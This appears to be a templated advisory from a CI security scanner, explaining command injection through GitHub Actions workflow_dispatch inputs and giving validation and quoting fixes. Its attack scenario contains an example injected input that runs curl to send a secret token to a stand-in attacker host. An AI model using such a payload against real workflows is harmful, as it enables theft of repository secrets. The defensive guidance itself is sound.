# Code Injection Via Input

## Vulnerability Description


Workflow_dispatch input {input_name} is used in shell commands without proper validation.
This creates code injection risks:

- User-controlled input is used directly in shell commands

- Attackers can inject malicious commands through workflow inputs

- Injected commands run with the workflows permissions

- Attackers can exfiltrate secrets, modify files, or perform unauthorized actions


Attack scenarios:

- Attacker triggers workflow_dispatch with malicious input: test; curl attacker.com/steal?token=$SECRET; #

- Workflow uses input in shell command without validation

- Malicious command executes, stealing secrets or compromising the system


## Recommendation


Validate and sanitize workflow inputs before use:


1. Validate inputs against allowlists:

- name: Validate input

run: |

if [[ ! \${{{{ inputs.{input_name} }}}}\ =~ ^[a-zA-Z0-9 ]+$ ]]; then

echo \Invalid input\

exit 1

fi


2. Sanitize inputs before use:

- name: Sanitize input

run: |

SAFE_INPUT=$(echo \${{{{ inputs.{input_name} }}}}\ | sed s/[^a-zA-Z0-9 ]//g)

# Use SAFE_INPUT instead of direct variable


3. Use environment variables with proper quoting:

- name: Use input

env:

INPUT_VALUE: ${{{{ inputs.{input_name} }}}}

run: |

echo \$INPUT_VALUE\  # Quoted to prevent injection


4. Avoid using inputs in dangerous contexts:

- Dont use in eval, exec, or command substitution

- Dont use in curl/wget URLs without validation

- Validate file paths if used in file operations


5. Use input types and validation:

on:

workflow_dispatch:

inputs:

{input_name}:

type: choice  # Use choice type when possible

options: [option1, option2]  # Limit to specific values


6. Review all uses of workflow_dispatch inputs

